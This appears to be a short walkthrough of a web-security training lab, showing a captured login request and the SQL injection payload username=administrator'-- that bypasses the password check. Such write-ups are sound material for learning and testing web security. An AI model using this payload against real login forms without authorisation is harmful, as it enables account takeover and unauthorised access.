# Lab: SQL injection vulnerability allowing login bypass
## Task
This lab contains an SQL injection vulnerability in the login function.

To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.

## Solution
The original POST request is:
```
POST /login HTTP/1.1
Host: ac0f1fb91e4d14cf80a903f200a100cd.web-security-academy.net
Cookie: session=6xNPtUMzVMrP2VIW54PysQfr47RD6HwF
Content-Length: 74
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://ac0f1fb91e4d14cf80a903f200a100cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ac0f1fb91e4d14cf80a903f200a100cd.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=w1HE2S5VZa0teQEU9kRtLfYbMUDOcMjl&username=administrator&password=test
```

To login successfully without a valid password, the payload is modified to:
```
username=administrator'--&password=test
```

![image](https://user-images.githubusercontent.com/44528004/130056546-5816ff8e-6fde-4af9-a520-e8d796c96662.png)

> Succeeded!
